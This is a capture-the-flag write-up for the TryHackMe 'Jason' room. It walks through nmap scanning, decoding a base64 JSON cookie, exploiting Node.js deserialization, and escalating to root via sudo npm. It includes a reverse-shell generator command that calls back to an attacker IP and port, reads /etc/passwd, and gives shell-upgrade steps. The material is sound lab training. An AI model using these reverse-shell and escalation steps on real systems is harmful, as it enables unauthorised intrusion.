# Trhyhackme Jason Writeup

* [Challenge](https://tryhackme.com/room/jason)

## Enumeration

### `sudo nmap -sV -sC -vv --script vuln -oA nmap-full 10.10.216.3`

* Output
```sh
Starting Nmap 7.92 ( https://nmap.org ) at 2021-10-09 18:09 CEST
NSE: Loaded 149 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 18:09
Completed NSE at 18:09, 10.00s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 18:09
Completed NSE at 18:09, 0.00s elapsed
Initiating Ping Scan at 18:09
Scanning 10.10.216.3 [4 ports]
Completed Ping Scan at 18:09, 0.07s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 18:09
Completed Parallel DNS resolution of 1 host. at 18:09, 0.04s elapsed
Initiating SYN Stealth Scan at 18:09
Scanning 10.10.216.3 [1000 ports]
Discovered open port 80/tcp on 10.10.216.3
Discovered open port 22/tcp on 10.10.216.3
Completed SYN Stealth Scan at 18:09, 1.18s elapsed (1000 total ports)
Initiating Service scan at 18:09
Scanning 2 services on 10.10.216.3
Completed Service scan at 18:10, 14.68s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.216.3.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 18:10
NSE Timing: About 98.89% done; ETC: 18:10 (0:00:00 remaining)
NSE Timing: About 98.89% done; ETC: 18:11 (0:00:01 remaining)
NSE Timing: About 98.89% done; ETC: 18:11 (0:00:01 remaining)
NSE Timing: About 98.89% done; ETC: 18:12 (0:00:01 remaining)
Completed NSE at 18:12, 131.13s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 18:12
Completed NSE at 18:12, 0.21s elapsed
Nmap scan report for 10.10.216.3
Host is up, received echo-reply ttl 63 (0.067s latency).
Scanned at 2021-10-09 18:09:50 CEST for 147s
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| vulners:
|   cpe:/a:openbsd:openssh:8.2p1:
|       CVE-2020-15778  6.8 https://vulners.com/cve/CVE-2020-15778
|       CVE-2020-12062  5.0 https://vulners.com/cve/CVE-2020-12062
|       MSF:ILITIES/GENTOO-LINUX-CVE-2021-28041/    4.6 https://vulners.com/metasploit/MSF:ILITIES/GENTOO-LINUX-CVE-2021-28041/ *EXPLOIT*
|       CVE-2021-28041  4.6 https://vulners.com/cve/CVE-2021-28041
|       CVE-2021-41617  4.4 https://vulners.com/cve/CVE-2021-41617
[...]
80/tcp open  http    syn-ack ttl 63
|_http-jsonp-detection: Couldn't find any JSONP endpoints.
| fingerprint-strings:
|   GetRequest, HTTPOptions:
|     HTTP/1.1 200 OK
|     Content-Type: text/html
|     Date: Sat, 09 Oct 2021 16:09:57 GMT
|     Connection: close
|     <html>
|     <title>Horror LLC</title>
       [...]
|     </html>
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-3299
|_      http://www.exploit-db.com/exploits/1244/
[...]
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 18:12
Completed NSE at 18:12, 0.00s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 18:12
Completed NSE at 18:12, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 159.18 seconds
           Raw packets sent: 1004 (44.152KB) | Rcvd: 1001 (40.036KB)
Starting Nmap 7.92 ( https://nmap.org ) at 2021-10-09 18:09 CEST
```

### `ffuf -c -v -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.10.216.3/FUZZ -fs 3559`
Nothing of interest

### Website
![Alt text](../include/jason/horror_llc.png?raw=true "Landing page")
* Cookie value starts with `eyJlbW`, that's definetly the beginning of a json object encoded as base64.
![Alt text](../include/jason/cookie.png?raw=true "Cookie Value")
* Testing an input value
```sh
whackx@manbox jwt_tool]$ echo "eyJlbWFpbCI6ImJpbGwuZ2F0ZXNAbWljcm9zb2Z0LmNvbSJ9" | base64 -d
{"email":"bill.gates@microsoft.com"}
```
* Assumption: this is the point of interest

### Finding intel
* Data gets serialized via backend node js. 
![Alt text](../include/jason/searchsploit.png?raw=true "Searchsploit")

## Exploit
* After searching for deserialization exploits and getting the hang of it, I spent some time crafting payloads manually without any luck. I took a look at some node shell generators and came up with [this one](https://github.com/hoainam1989/training-application-security/blob/master/shell/node_shell.py). This did the trick. Pasting the payload, and we get a shell
```
python2  tools/reverse_shells/node_shell.py -r -h 10.9.47.11 -p 4448 -e  -o
```
### Enumerating the server
```sh
$id
uid=1000(dylan) gid=1000(dylan) groups=1000(dylan)

$ pwd
/opt/webapp

$ cat /etc/passwd
[...]
dylan:x:1000:1000:dylan:/home/dylan:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
```
* `dylan` is not in the lxd group.
* Flag is at `/home/dylan/user.txt`

#### Shell upgrade
```sh
uname -a
linux jason 5.4.0-74-generic #83-Ubuntu SMP Sat May 8 02:35:39 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
```
* It is ubuntu, shell upgrade will contain a 3 ;)
```sh
python3 -c "import pty;pty.spawn('/bin/bash')"
```
* `stty raw -echo` Locally
* `export TERM=xterm-256color` on target
* Shell is interactive now, `sudo -l` is the next step.
```sh
dylan@jason:/opt/webapp$ sudo -l
Matching Defaults entries for dylan on jason:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dylan may run the following commands on jason:
    (ALL) NOPASSWD: /usr/bin/npm *
```
* Take a good look at [gtfobins](https://gtfobins.github.io) and get the root flag
![Alt text](../include/jason/root_shell.png?raw=true "Root shell")
